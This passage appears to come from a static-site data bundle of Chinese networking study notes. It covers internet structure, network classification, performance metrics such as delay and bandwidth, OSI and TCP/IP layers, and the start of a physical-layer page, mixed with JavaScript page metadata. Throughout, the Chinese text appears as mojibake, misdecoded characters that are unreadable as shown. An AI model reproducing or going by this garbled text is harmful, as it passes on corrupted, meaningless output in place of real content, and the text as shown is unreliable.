¼çå®ä¹ãä¸ä¸ªæ¯è¾å¥½çå®ä¹æ¯ï¼è®¡ç®æºç½ç»æ¯ä¸äºéç¨çãå¯ç¼ç¨çç¡¬ä»¶äºè¿å½¢æçï¼è¿äºç¡¬ä»¶å¹¶éä¸é¨ç¨æ¥å®ç°æä¸ç¹å®çç®çã\n\n\n# è®¡ç®æºç½ç»çåç±»\n\n# æç§ç½ç»çä½ç¨èå´åç±»\n\n 1. å¹¿åç½WAN ï¼ èå´å åå°å åå¬éï¼äºèç½çæ ¸å¿ã\n 2. ååç½MANï¼ä¸è¬èå´æ¯ä¸ä¸ªåå¸\n 3. å±åç½LANï¼ä¸è¬æ¯ä¼ä¸æèæ ¡å­ç½ç»\n 4. ä¸ªäººåºåç½PANï¼ä¸ªäººå·¥ä½å°æ¹æä¸ªäººè®¾å¤è¿æ¥å½¢æçç½ç»ã\n\n# æç§ä½¿ç¨èè¿è¡åç±»\n\n 1. å¬ç¨ç½ï¼çµä¿¡å¬å¸å»ºé çå¬ç¨æ¶è´¹çå¤§åç½ç»\n 2. ä¸ç¨ç½ï¼ç¹æ®åä½çç¹æ®ç¨éçç½ç»\n\n# ç¨æ·æ¥å¥ç½ç»\n\nè¿ç§ç½ç»ç§°ä¸ºæ¥å¥ç½ANï¼åç§°ä¸ºæ¬å°æ¥å¥ç½ï¼æèå±æ°æ¥å¥ç½ãè¿ç§ç½ç»æ¯è¾ç¹æ®ï¼éè¿ISPè¿è¡æ¥å¥äºèç½ã\n\n\n# è®¡ç®æºç½ç»çæ§è½\n\n# 1. éç\n\nä¸ä¸ªbitæ¯ä¸ä¸ªäºè¿å¶ç0æè1ãæ¯ç¹æ¯ä¿¡æ¯è®ºä¸­ä½¿ç¨çä¿¡æ¯éçåä½ã\n\néçå¼çæ¯æ°æ®çä¼ ééçãä¹ç§°ä¸ºæ°æ®çãæ¯ç¹çãåä½æ¯ï¼bit/sãbps ãb/sã\n\n# 2. å¸¦å®½\n\nå¸¦å®½æ¬æ¥çæææ¯ä¿¡å·çé¢å¸¦å®½åº¦ï¼åä½æ¯èµ«å¹ãå¨è®¡ç®æºç½ç»ä¸­ï¼å¸¦å®½ç¨äºè¡¨ç¤ºç½ç»ä¸­æä¸ªééçä¼ éæ°æ®çè½åãç½ç»çå¸¦å®½è¡¨ç¤ºåä½æ¶é´åï¼ç½ç»ä¸­çæä¸ªä¿¡éçæé«æ°æ®çãå¸¦å®½çåä½å°±æ¯æ°æ®ççåä½ã\n\n# 3. ååé\n\nååéè¡¨ç¤ºå¨åä½æ¶é´éè¿ç½ç»ï¼ä¿¡éãæ¥å£ï¼çå®éæ°æ®éã\n\n# 4. æ¶å»¶\n\næ¶å»¶æ¯ææ°æ®ä»ç½ç»çä¸ç«¯å°å¦ä¸ç«¯æéçæ¶é´ãä¹ç§°ä¸º å»¶è¿ãè¿å»¶ã\n\næ¶å»¶= åéæ¶å»¶ + ä¼ æ­æ¶å»¶ + å¤çæ¶å»¶ + æéæ¶å»¶\n\n# åéæ¶å»¶\n\nä¸»æºæèè·¯ç±å¨åéæ°æ®å¸§æéè¦çæ¶é´ï¼ä»ç¬¬ä¸ä¸ªæ¯ç¹ç®èµ·å°æåä¸ä¸ªæ¯ç¹åéå®ææéçæ¶é´ã\n\n\n\n# ä¼ æ­æ¶å»¶\n\nä¼ æ­æ¶å»¶æ¯çµç£æ³¢å¨ä¿¡éä¸­ä¼ æ­ä¸å®çè·ç¦»è±è´¹çæ¶é´ã\n\n\n\n# å¤çæ¶å»¶\n\nä¸»æºæèè·¯ç±å¨ä»æ¶å°æ°æ®åå°åéæ°æ®åä¹é´å¤çæ°æ®çæ¶é´ãè¿è¡åæãæåãå·®éæ ¡éªç­è±è´¹çæ¶é´ã\n\n# æéæ¶å»¶\n\nåç»å¨ç»è¿ç½ç»ä¼ è¾ä¸­éè¦ç»è¿å¤ä¸ªè·¯ç±å¨ï¼éè¦è¿è¡ç­å¾ã\n\n\n\n# 5.æ¶å»¶å¸¦å®½ç§¯\n\nä¼ æ­æ¶å»¶åå¸¦å®½ç¸ä¹ï¼å¾å°çæ¶å»¶å¸¦å®½ç§¯ãè¡¨ç¤ºç®¡éçä½ç§¯ï¼å¯ä»¥æå¤§å®¹çº³å¤å°bitéè¿ã\n\n\n\n# 6.å¾è¿æ¶é´ï¼RTTï¼\n\nå¾è¿æ¶é´æ¯ä¸ä¸ªéè¦çææ ãæ°æ®ä»åéå°ååºä¹é´çæ¶é´ã\n\n# 7.å©ç¨ç\n\nå©ç¨çæä¸¤ç§ï¼ä¸ç§æ¯ä¿¡éå©ç¨çï¼è¿æä¸ç§æ¯ç½ç»å©ç¨çãå¦æD0è¡¨ç¤ºç½ç»ç©ºé²æ¶çæ¶å»¶ï¼Dè¡¨ç¤ºå½åç½ç»çæ¶å»¶ãååå©ç¨çUçå³ç³»ä¸ºï¼\n\n\n\nå æ­¤ï¼ä¿¡éæèç½ç»çå©ç¨çè¿é«åä¼å¯¼è´æ¶å»¶å¢å¤§ã\n\n\n\n\n# éæ§è½ææ \n\n 1. è´¹ç¨\n 2. è´¨é\n 3. æ åå\n 4. å¯é æ§\n 5. å¯æ©å±æ§åå¯åçº§æ§\n 6. æäºç®¡çåç»´æ¤\n\n\n# è®¡ç®æºç½ç»ä½ç³»ç»æ\n\n> å¼æ¾ç³»ç»äºè¿åºæ¬åèæ¨¡åOSI/RM\n\n\n# åè®®åååå±æ¬¡\n\nå¨è®¡ç®æºç½ç»ä¸­äº¤æ¢æ°æ®å°±åå¯å¿«éä¸æ ·ï¼éè¦éµå®ä¸äºäºåçº¦å®å¥½çè§åï¼è¿äºè§åæç¡®è§å®äºäº¤æ¢çæ°æ®çæ ¼å¼åæå³çåæ­¥é®é¢ã\n\nç½ç»åè®®ç±ä»¥ä¸ä¸é¨åç»æï¼\n\n * è¯­æ³ï¼æ°æ®åæ§å¶ä¿¡æ¯çæ ¼å¼\n * è¯­ä¹ï¼æ§å¶ä¿¡æ¯çç§ç±»ãå¨ä½åååºã\n * åæ­¥ï¼äºä»¶çæ§è¡é¡ºåº\n\nååå±æ¬¡çå¥½å¤ï¼\n\n * åå±ä¹é´ç¸äºç¬ç«\n * çµæ´»æ§å¥½\n * ç»æä¸åå²\n * æäºå®ç°åç»´æ¤\n * ä¿è¿æ ååå·¥ä½\n\nè®¡ç®æºç½ç»çåå±åå¶åè®®çéåå°±æ¯ç½ç»çä½ç³»ç»æã\n\n\n# äºå±ä½ç³»ç»æ\n\nOSIä¸å±çä½ç³»ç»ææ¦å¿µæ¸æ°ãçè®ºå®æ´ï¼ä½æ¯å¹¶ä¸å®ç¨ã\n\n\n\n * åºç¨å±ï¼éè¿è¿ç¨ä¹é´çäº¤äºå®æç¹å®çç½ç»åºç¨ãå¸¸è§çåè®®ï¼DNSãHTTPãHTTPSãSMTPç­ï¼ï¼äº¤æ¢çæ°æ®ååä¸ºæ¥æã\n * è¿è¾å±ï¼ä¸¤å°ä¸»æºä¸­è¿ç¨ä¹é´çéä¿¡æä¾æ°æ®ä¼ è¾æå¡ãä¸»è¦çåè®®ï¼ä¼ è¾æ§å¶åè®®ï¼TCPãå¯é ä¼ è¾ãé¢åè¿æ¥ãæ¥ææ®µï¼ãæ°æ®ç¨æ·æ¥åè®®ï¼UDPãæ è¿æ¥ãæå¤§åªåçæ°æ®ä¼ è¾ãç¨æ·æ°æ®æ¥ï¼\n * ç½ç»å±ï¼è´è´£ä¸ºåç»äº¤æ¢ç½ä¸çä¸åä¸»æºæä¾æå¡ãå°è¿è¾å±äº§ççæ¥ææ®µå°è£æåç»æèåè¿è¡ä¼ éãç½ç»å±ä½¿ç¨IPåè®®ï¼åç»ç§°ä¸ºIPæ°æ®æ¥ã\n * æ°æ®é¾è·¯å±ï¼ç§°ä¸ºé¾è·¯å±ãå°ç½ç»å±çIPæ°æ®æ¥å°è£ææ°æ®å¸§ãMACå°åå·¥ä½çå±çº§ã\n * ç©çå±ï¼ä¼ è¾çæ¯æ¯ç¹ã\n\n\n\nOSIåèæ¨¡åæå¯¹ç­å±æ¬¡ä¹é´ä¼ éçæ°æ®ååç§°ä¸ºè¯¥å±çåè®®æ°æ®ååPDU\n\n\n# TCP/IPä½ç³»ç»æ\n\nTCP/IPåªç±åå±ç»æã\n\n\n\nä½æ¯ææ¯çåå±å¹¶æ²¡æä¸¥æ ¼éµå¾ªè¿ä¸ªä½ç³»ç»æãå¦ä¸å¾æç¤ºï¼\n\n",normalizedContent:"# ãè®¡ç®æºç½ç»ãæ¦è¿°\n\n> åèä¹¦ï¼è®¡ç®æºç½ç»ï¼ç¬¬ä¸çï¼è°¢å¸ä»åçç¼èã\n\n\n# è®¡ç®æºç½ç»å¨ä¿¡æ¯æ¶ä»£çä½ç¨\n\n> 21ä¸çºªçéè¦ç¹å¾ï¼æ°å­åãç½ç»åãä¿¡æ¯åãæ¯ä¸ä¸ªä»¥ç½ç»ä¸ºæ ¸å¿çæ¶ä»£ã\n\nä¸å¤§ç½ç»ï¼çµä¿¡ç½ç»ãæçº¿çµè§ç½ç»ãè®¡ç®æºç½ç»\n\näºèç½çä¸¤ä¸ªéè¦çåºæ¬ç¹ç¹ï¼\n\n * è¿éæ§ï¼ä¸ç®¡è·ç¦»å¤è¿é½å¥½åç´æ¥å½¼æ­¤ç¸è¿ä¸æ ·\n * å±äº«ï¼èµæºå±äº«ï¼æå¡å¨ä¸çèµæºå¥½åå¨ç¨æ·èº«è¾¹ä¸æ ·æ¹ä¾¿ã\n\n\n# äºèç½æ¦è¿°\n\n\n# ç½ç»çç½ç»\n\n> è®¡ç®æºç½ç»ï¼ç±è¥å¹²èç¹åè¿æ¥èç¹çé¾è·¯ç»æãèç¹å¯ä»¥æ¯è®¡ç®æºãéçº¿å¨ãäº¤æ¢æºç­ã\n\nç½ç»ä¹é´éè¿è·¯ç±å¨è¿æ¥ï¼å½¢æäºä¸ä¸ªè¦çèå´æ´å¤§çç½ç»ï¼ç§°ä¸º ç½ç»çç½ç»ï¼ä¹å°±æ¯æä»¬å¸¸è¯´çäºè¿ç½ã\n\nç½ç»å°±æ¯æè®¸å¤è®¡ç®æºè¿æ¥å¨ä¸èµ·ï¼èäºè¿ç½åæ¯æè®¸å¤ç½ç»éè¿è·¯ç±å¨è¿æ¥å¨ä¸èµ·ã\n\n\n# ç½ç»çåå±é¶æ®µ\n\n * åä¸ªç½ç»arpaneté¡¹äºèç½çåå±è¿ç¨\n   \n   ç¬¬ä¸ä¸ªåç»äº¤æ¢ç½ç»ï¼arpanet ï¼ç¾å½å½é²é¨åå»ºï¼\n   \n   1983å¹´tcp/ipåè®®ç§°ä¸ºarpanetçæ ååè®®\n\n * å»ºæä¸çº§ç»æçäºèç½\n   \n   ä¸çº§ç½ç»åä¸ºï¼ä¸»å¹²ç½ãå°åºç½ãæ ¡å­ç½ï¼ä¼ä¸ç½ï¼\n\n * å¤å±æ¬¡ispç»æçäºèç½\n\n\n\n\n# äºèç½çæ ååå·¥ä½\n\näºèç½æ ååç»ç»ï¼äºèç½åä¼ï¼isocï¼\n\n * äºèç½ä½ç³»ç»æå§åä¼ï¼iabï¼\n   * äºèç½å·¥ç¨é¨ï¼ietfï¼\n   * äºèç½ç ç©¶é¨ï¼irtfï¼\n\næå®äºèç½æ åçä¸é¶æ®µ\n\n * äºèç½èæ¡\n * å»ºè®®æ å\n * äºèç½æ å\n\n\n# äºèç½çç»æ\n\n> ä»å·¥ä½æ¹å¼ä¸ï¼äºèç½å¯ä»¥ååä¸ºä¸¤ä¸ªé¨åï¼è¾¹ç¼é¨ååæ ¸å¿é¨åã\n\nè¾¹ç¼é¨åï¼ç¨æ·ç´æ¥ä½¿ç¨çï¼ææè¿æ¥å¨äºèç½ä¸çä¸»æºã\n\næ ¸å¿é¨åï¼ä¸ºè¾¹ç¼é¨åæä¾æå¡ï¼ç±å¤§éçç½ç»åè¿æ¥å¨è¿äºç½ç»ä¸çè·¯ç±å¨ç»æã\n\n\n\n\n# äºèç½çè¾¹ç¼é¨å\n\näºèç½çè¾¹ç¼é¨åæ¯è¿æ¥å¨äºèç½ä¸çææä¸»æºï¼ç§°ä¸º ç«¯ç³»ç»ã\n\næä»¬å¸¸è¯´çä¸»æºaåä¸»æºbéä¿¡ï¼å®éä¸æ¯ä¸»æºaä¸çæä¸ªç¨åºåä¸»æºbä¸çæä¸ä¸ªç¨åºè¿è¡éä¿¡ãç®ç§°ä¸ºè®¡ç®æºä¹é´çéä¿¡ã\n\nå¨ç½ç»çè¾¹ç¼é¨åç«¯ç³»ç»çéä¿¡å¯ä»¥åä¸ºä¸¤å¤§ç±»ï¼\n\n * csæ¹å¼\n   \n   å®¢æ·ç«¯æ¯æå¡è¯·æ±æ¹ï¼æå¡å¨æ¯æå¡æä¾æ¹\n   \n   \n\n * p2pæ¹å¼\n   \n   \n\n\n# äºèç½çæ ¸å¿é¨å\n\nå¨æ ¸å¿é¨åèµ·å°éè¦ä½ç¨çæ¯ è·¯ç±å¨ãè·¯ç±å¨æ¯ä¸ç§ç¹æ®çè®¡ç®æºï¼è·¯ç±å¨æ¯å®ç° åç»äº¤æ¢çå³é®æä»¶ï¼ä»»å¡æ¯ è½¬åå°å¶ä»çåç»ã\n\n\n# çµè·¯äº¤æ¢\n\næ´ä¸ªæ¥æçæ¯ç¹æµä»èµ·ç¹å°ç»ç¹ï¼å¥½åå¨ä¸ä¸ªç®¡éä¸­ä¼ éã\n\n\n# åç»äº¤æ¢\n\nåä¸ªåç»ä¼ å°ç¸é»çèç¹ï¼å­å¨ä¸æ¥ï¼ç¶åæ¥è½¬åè¡¨ï¼è½¬åå°ä¸ä¸ä¸ªèç¹ã\n\n\n# æ¥æäº¤æ¢\n\næ´ä¸ªæ¥æåä¼ éå°ç¸é»çèç¹ï¼å¨é¨å­å¨ä¸æ¥ï¼åæ¥è¯¢è½¬åè¡¨ï¼è½¬åå°ä¸ä¸ä¸ªèç¹ã\n\n\n\n\n# è®¡ç®æºç½ç»å¨æå½çåå±\n\n> ææ©å»ºç«å¹¿åç½çæ¯ééé¨ã1994å¹´4æ20æ¥æå½ç¨64kbpsä¸çº¿æ¥å¥äºèç½ã\n\n\n# è®¡ç®æºç½ç»çç±»å«\n\n\n# è®¡ç®æºç½ç»çå®ä¹\n\nè®¡ç®æºç½ç»å¹¶æ²¡æä¸¥æ ¼çå®ä¹ãä¸ä¸ªæ¯è¾å¥½çå®ä¹æ¯ï¼è®¡ç®æºç½ç»æ¯ä¸äºéç¨çãå¯ç¼ç¨çç¡¬ä»¶äºè¿å½¢æçï¼è¿äºç¡¬ä»¶å¹¶éä¸é¨ç¨æ¥å®ç°æä¸ç¹å®çç®çã\n\n\n# è®¡ç®æºç½ç»çåç±»\n\n# æç§ç½ç»çä½ç¨èå´åç±»\n\n 1. å¹¿åç½wan ï¼ èå´å åå°å åå¬éï¼äºèç½çæ ¸å¿ã\n 2. ååç½manï¼ä¸è¬èå´æ¯ä¸ä¸ªåå¸\n 3. å±åç½lanï¼ä¸è¬æ¯ä¼ä¸æèæ ¡å­ç½ç»\n 4. ä¸ªäººåºåç½panï¼ä¸ªäººå·¥ä½å°æ¹æä¸ªäººè®¾å¤è¿æ¥å½¢æçç½ç»ã\n\n# æç§ä½¿ç¨èè¿è¡åç±»\n\n 1. å¬ç¨ç½ï¼çµä¿¡å¬å¸å»ºé çå¬ç¨æ¶è´¹çå¤§åç½ç»\n 2. ä¸ç¨ç½ï¼ç¹æ®åä½çç¹æ®ç¨éçç½ç»\n\n# ç¨æ·æ¥å¥ç½ç»\n\nè¿ç§ç½ç»ç§°ä¸ºæ¥å¥ç½anï¼åç§°ä¸ºæ¬å°æ¥å¥ç½ï¼æèå±æ°æ¥å¥ç½ãè¿ç§ç½ç»æ¯è¾ç¹æ®ï¼éè¿ispè¿è¡æ¥å¥äºèç½ã\n\n\n# è®¡ç®æºç½ç»çæ§è½\n\n# 1. éç\n\nä¸ä¸ªbitæ¯ä¸ä¸ªäºè¿å¶ç0æè1ãæ¯ç¹æ¯ä¿¡æ¯è®ºä¸­ä½¿ç¨çä¿¡æ¯éçåä½ã\n\néçå¼çæ¯æ°æ®çä¼ ééçãä¹ç§°ä¸ºæ°æ®çãæ¯ç¹çãåä½æ¯ï¼bit/sãbps ãb/sã\n\n# 2. å¸¦å®½\n\nå¸¦å®½æ¬æ¥çæææ¯ä¿¡å·çé¢å¸¦å®½åº¦ï¼åä½æ¯èµ«å¹ãå¨è®¡ç®æºç½ç»ä¸­ï¼å¸¦å®½ç¨äºè¡¨ç¤ºç½ç»ä¸­æä¸ªééçä¼ éæ°æ®çè½åãç½ç»çå¸¦å®½è¡¨ç¤ºåä½æ¶é´åï¼ç½ç»ä¸­çæä¸ªä¿¡éçæé«æ°æ®çãå¸¦å®½çåä½å°±æ¯æ°æ®ççåä½ã\n\n# 3. ååé\n\nååéè¡¨ç¤ºå¨åä½æ¶é´éè¿ç½ç»ï¼ä¿¡éãæ¥å£ï¼çå®éæ°æ®éã\n\n# 4. æ¶å»¶\n\næ¶å»¶æ¯ææ°æ®ä»ç½ç»çä¸ç«¯å°å¦ä¸ç«¯æéçæ¶é´ãä¹ç§°ä¸º å»¶è¿ãè¿å»¶ã\n\næ¶å»¶= åéæ¶å»¶ + ä¼ æ­æ¶å»¶ + å¤çæ¶å»¶ + æéæ¶å»¶\n\n# åéæ¶å»¶\n\nä¸»æºæèè·¯ç±å¨åéæ°æ®å¸§æéè¦çæ¶é´ï¼ä»ç¬¬ä¸ä¸ªæ¯ç¹ç®èµ·å°æåä¸ä¸ªæ¯ç¹åéå®ææéçæ¶é´ã\n\n\n\n# ä¼ æ­æ¶å»¶\n\nä¼ æ­æ¶å»¶æ¯çµç£æ³¢å¨ä¿¡éä¸­ä¼ æ­ä¸å®çè·ç¦»è±è´¹çæ¶é´ã\n\n\n\n# å¤çæ¶å»¶\n\nä¸»æºæèè·¯ç±å¨ä»æ¶å°æ°æ®åå°åéæ°æ®åä¹é´å¤çæ°æ®çæ¶é´ãè¿è¡åæãæåãå·®éæ ¡éªç­è±è´¹çæ¶é´ã\n\n# æéæ¶å»¶\n\nåç»å¨ç»è¿ç½ç»ä¼ è¾ä¸­éè¦ç»è¿å¤ä¸ªè·¯ç±å¨ï¼éè¦è¿è¡ç­å¾ã\n\n\n\n# 5.æ¶å»¶å¸¦å®½ç§¯\n\nä¼ æ­æ¶å»¶åå¸¦å®½ç¸ä¹ï¼å¾å°çæ¶å»¶å¸¦å®½ç§¯ãè¡¨ç¤ºç®¡éçä½ç§¯ï¼å¯ä»¥æå¤§å®¹çº³å¤å°bitéè¿ã\n\n\n\n# 6.å¾è¿æ¶é´ï¼rttï¼\n\nå¾è¿æ¶é´æ¯ä¸ä¸ªéè¦çææ ãæ°æ®ä»åéå°ååºä¹é´çæ¶é´ã\n\n# 7.å©ç¨ç\n\nå©ç¨çæä¸¤ç§ï¼ä¸ç§æ¯ä¿¡éå©ç¨çï¼è¿æä¸ç§æ¯ç½ç»å©ç¨çãå¦æd0è¡¨ç¤ºç½ç»ç©ºé²æ¶çæ¶å»¶ï¼dè¡¨ç¤ºå½åç½ç»çæ¶å»¶ãååå©ç¨çuçå³ç³»ä¸ºï¼\n\n\n\nå æ­¤ï¼ä¿¡éæèç½ç»çå©ç¨çè¿é«åä¼å¯¼è´æ¶å»¶å¢å¤§ã\n\n\n\n\n# éæ§è½ææ \n\n 1. è´¹ç¨\n 2. è´¨é\n 3. æ åå\n 4. å¯é æ§\n 5. å¯æ©å±æ§åå¯åçº§æ§\n 6. æäºç®¡çåç»´æ¤\n\n\n# è®¡ç®æºç½ç»ä½ç³»ç»æ\n\n> å¼æ¾ç³»ç»äºè¿åºæ¬åèæ¨¡åosi/rm\n\n\n# åè®®åååå±æ¬¡\n\nå¨è®¡ç®æºç½ç»ä¸­äº¤æ¢æ°æ®å°±åå¯å¿«éä¸æ ·ï¼éè¦éµå®ä¸äºäºåçº¦å®å¥½çè§åï¼è¿äºè§åæç¡®è§å®äºäº¤æ¢çæ°æ®çæ ¼å¼åæå³çåæ­¥é®é¢ã\n\nç½ç»åè®®ç±ä»¥ä¸ä¸é¨åç»æï¼\n\n * è¯­æ³ï¼æ°æ®åæ§å¶ä¿¡æ¯çæ ¼å¼\n * è¯­ä¹ï¼æ§å¶ä¿¡æ¯çç§ç±»ãå¨ä½åååºã\n * åæ­¥ï¼äºä»¶çæ§è¡é¡ºåº\n\nååå±æ¬¡çå¥½å¤ï¼\n\n * åå±ä¹é´ç¸äºç¬ç«\n * çµæ´»æ§å¥½\n * ç»æä¸åå²\n * æäºå®ç°åç»´æ¤\n * ä¿è¿æ ååå·¥ä½\n\nè®¡ç®æºç½ç»çåå±åå¶åè®®çéåå°±æ¯ç½ç»çä½ç³»ç»æã\n\n\n# äºå±ä½ç³»ç»æ\n\nosiä¸å±çä½ç³»ç»ææ¦å¿µæ¸æ°ãçè®ºå®æ´ï¼ä½æ¯å¹¶ä¸å®ç¨ã\n\n\n\n * åºç¨å±ï¼éè¿è¿ç¨ä¹é´çäº¤äºå®æç¹å®çç½ç»åºç¨ãå¸¸è§çåè®®ï¼dnsãhttpãhttpsãsmtpç­ï¼ï¼äº¤æ¢çæ°æ®ååä¸ºæ¥æã\n * è¿è¾å±ï¼ä¸¤å°ä¸»æºä¸­è¿ç¨ä¹é´çéä¿¡æä¾æ°æ®ä¼ è¾æå¡ãä¸»è¦çåè®®ï¼ä¼ è¾æ§å¶åè®®ï¼tcpãå¯é ä¼ è¾ãé¢åè¿æ¥ãæ¥ææ®µï¼ãæ°æ®ç¨æ·æ¥åè®®ï¼udpãæ è¿æ¥ãæå¤§åªåçæ°æ®ä¼ è¾ãç¨æ·æ°æ®æ¥ï¼\n * ç½ç»å±ï¼è´è´£ä¸ºåç»äº¤æ¢ç½ä¸çä¸åä¸»æºæä¾æå¡ãå°è¿è¾å±äº§ççæ¥ææ®µå°è£æåç»æèåè¿è¡ä¼ éãç½ç»å±ä½¿ç¨ipåè®®ï¼åç»ç§°ä¸ºipæ°æ®æ¥ã\n * æ°æ®é¾è·¯å±ï¼ç§°ä¸ºé¾è·¯å±ãå°ç½ç»å±çipæ°æ®æ¥å°è£ææ°æ®å¸§ãmacå°åå·¥ä½çå±çº§ã\n * ç©çå±ï¼ä¼ è¾çæ¯æ¯ç¹ã\n\n\n\nosiåèæ¨¡åæå¯¹ç­å±æ¬¡ä¹é´ä¼ éçæ°æ®ååç§°ä¸ºè¯¥å±çåè®®æ°æ®ååpdu\n\n\n# tcp/ipä½ç³»ç»æ\n\ntcp/ipåªç±åå±ç»æã\n\n\n\nä½æ¯ææ¯çåå±å¹¶æ²¡æä¸¥æ ¼éµå¾ªè¿ä¸ªä½ç³»ç»æãå¦ä¸å¾æç¤ºï¼\n\n",charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"ãè®¡ç®æºç½ç»ãç©çå±",frontmatter:{title:"ãè®¡ç®æºç½ç»ãç©çå±",date:"2022-05-06T00:00:00.000Z",permalink:"/dev/basic/network/physicallayer",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","è®¡ç®æºåºç¡","è®¡ç®æºç½ç»"],tags:["è®¡ç®æºç½ç»"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/102.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1021.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/01.%E7%89%A9%E7%90%86%E5%B1%82.html",relativePath:"01.å¼å/102.è®¡ç®æºåºç¡/1021.è®¡ç®æºç½ç»/01.ç©çå±.md",key:"v-60fcebe2",path:"/dev/basic/network/physicallayer/",headers:[{level:2,title:"ç©çå±çåºæ¬æ¦å¿µ",slug:"ç©çå±çåºæ¬æ¦å¿µ",normalizedTitle:"ç©çå±çåºæ¬æ¦å¿µ",charIndex:45},{level:2,title:"æ°æ®éä¿¡åºç¡ç¥è¯",slug:"æ°æ®éä¿¡åºç¡ç¥è¯",normalizedTitle:"æ°æ®éä¿¡åºç¡ç¥è¯",charIndex:229},{level:3,title:"æ°æ®éä¿¡çæ¨¡å",slug:"æ°æ®éä¿¡çæ¨¡å",normalizedTitle:"æ°æ®éä¿¡çæ¨¡å",charIndex:242},{level:3,title:"ä¿¡éçåºæ¬æ¦å¿µ",slug:"ä¿¡éçåºæ¬æ¦å¿µ",normalizedTitle:"ä¿¡éçåºæ¬æ¦å¿µ",charIndex:373},{level:3,title:"ä¿¡éçæéå®¹é",slug:"ä¿¡éçæéå®¹é",normalizedTitle:"ä¿¡éçæéå®¹é",charIndex:772},{level:2,title:"ç©çå±çä¼ è¾åªä»",slug:"ç©çå±çä¼ è¾åªä»",normalizedTitle:"ç©çå±çä¼ è¾åªä»",charIndex:864},{level:3,title:"å¯¼å¼åä¼ è¾åªä½",slug:"å¯¼å¼åä¼ è¾åªä½",normalizedTitle:"å¯¼å¼åä¼ è¾åªä½",charIndex:888},{level:3,title:"éå¼å¯¼åä¼ è¾åªä½",slug:"éå¼å¯¼åä¼ è¾åªä½",normalizedTitle:"éå¼å¯¼åä¼ è¾åªä½",charIndex:1154},{level:2,title:"ä¿¡éå¤ç¨ææ¯",slug:"ä¿¡éå¤ç¨ææ¯",normalizedTitle:"ä¿¡éå¤ç¨ææ¯",charIndex:1301},{level:3,title:"é¢åå¤ç¨ãæ¶åå¤ç¨ãç»è®¡æ¶åå¤ç¨",slug:"é¢åå¤ç¨ãæ¶åå¤ç¨ãç»è®¡æ¶åå¤ç¨",normalizedTitle:"é¢åå¤ç¨ãæ¶åå¤ç¨ãç»è®¡æ¶åå¤ç¨",charIndex:1342},{level:3,title:"æ³¢åå¤ç¨",slug:"æ³¢åå¤ç¨",normalizedTitle:"æ³¢åå¤ç¨",charIndex:1674},{level:3,title:"ç åå¤ç¨",slug:"ç åå¤ç¨",normalizedTitle:"ç åå¤ç¨",charIndex:1700},{level:2,title:"å®½å¸¦æ¥å¥ææ¯",slug:"å®½å¸¦æ¥å¥ææ¯",normalizedTitle:"å®½å¸¦æ¥å¥ææ¯",charIndex:1758},{level:3,title:"ADSLææ¯",slug:"adslææ¯",normalizedTitle:"adslææ¯",charIndex:1769},{level:3,title:"åçº¤åè½´æ··åç½ï¼HFCï¼",slug:"åçº¤åè½´æ··åç½-hfc",normalizedTitle:"åçº¤åè½´æ··åç½ï¼hfcï¼",charIndex:1828},{level:3,title:"FTTxææ¯",slug:"fttxææ¯",normalizedTitle:"fttxææ¯",charIndex:1876}],excerpt:'<h1 id="ç©çå±"><a class="header-anchor" href="#ç©çå±">#</a> ç©çå±</h1>\n<blockquote>\n<p>ç©çå±å®ä¹äºä¼ è¾åªä»çæºæ¢°ç¹æ§ãçµæ°ç¹æ§ãåè½ç¹æ§ãè¿ç¨ç¹æ§ã</p>\n</blockquote>\n',headersStr:"ç©çå±çåºæ¬æ¦å¿µ æ°æ®éä¿¡åºç¡ç¥è¯ æ°æ®éä¿¡çæ¨¡å ä¿¡éçåºæ¬æ¦å¿µ ä¿¡éçæéå®¹é ç©çå±çä¼ è¾åªä» å¯¼å¼åä¼ è¾åªä½ éå¼å¯¼åä¼ è¾åªä½ ä¿¡éå¤ç¨ææ¯ é¢åå¤ç¨ãæ¶åå¤ç¨ãç»è®¡æ¶åå¤ç¨ æ³¢åå¤ç¨ ç åå¤ç¨ å®½å¸¦æ¥å¥ææ¯ ADSLææ¯ åçº¤åè½´æ··åç½ï¼HFCï¼ FTTxææ¯",content:"# ç©çå±\n\n> ç©çå±å®ä¹äºä¼ è¾åªä»çæºæ¢°ç¹æ§ãçµæ°ç¹æ§ãåè½ç¹æ§ãè¿ç¨ç¹æ§ã\n\n\n# ç©çå±çåºæ¬æ¦å¿µ\n\n> ç©çå±çä½ç¨æ¯å°½å¯è½çå±è½æä¼ è¾åªä»ä¹é´çå·®å¼ï¼ä½¿ç©çå±ä¸é¢çé¾è·¯å±æåä¸å°è¿äºå·®å¼ã\n> \n> ç©çå±å®ä¹äºä¼ è¾åªä»çæºæ¢°ç¹æ§ãçµæ°ç¹æ§ãåè½ç¹æ§ãè¿ç¨ç¹æ§ã\n\n * æºæ¢°ç¹æ§ï¼æ¥å£æç¨çæ¥çº¿å¨çå°ºå¯¸ãå½¢ç¶ãéèãæåãéå®ç­\n * çµæ°ç¹æ§ï¼ææ¥å£çµç¼çå¸éèå´\n * åè½ç¹æ§ï¼çµå¹³çå«ä¹\n * è¿ç¨ç¹æ§ï¼äºä»¶çåçåºç°çé¡ºåºã\n\n\n# æ°æ®éä¿¡åºç¡ç¥è¯\n\n\n# æ°æ®éä¿¡çæ¨¡å\n\nä¸ä¸ªæ°æ®éä¿¡ç³»ç»å¯ä»¥åä¸ºä¸ä¸ªé¨åï¼æºç³»ç»ãç®çç³»ç»ã\n\n\n\néä¿¡çç®çæ¯ä¼ éæ¶æ¯ï¼è¯é³ãæå­ãå¾åãè§é¢ç­ï¼ï¼æ°æ®æ¯è¿éæ¶æ¯çå®ä½ãä¿¡å·æ¯æ°æ®ççµæ°æèçµç£çè¡¨ç°ã\n\nä¿¡å·åä¸ºä¸¤å¤§ç±»ï¼\n\n * æ¨¡æä¿¡å·ï¼è¿ç»­ç\n * æ°å­ä¿¡å·ï¼ç¦»æ£ç\n\n\n# ä¿¡éçåºæ¬æ¦å¿µ\n\nä»éä¿¡åæ¹çä¿¡æ¯äº¤äºå¯ä»¥åä¸ºä¸ç§æ¹å¼ï¼\n\n * ååéä¿¡ï¼åå·¥ - çµè§æºãçµå°\n * ååäº¤æ¿éä¿¡ï¼ååå·¥ - å¯¹è®²æº\n * 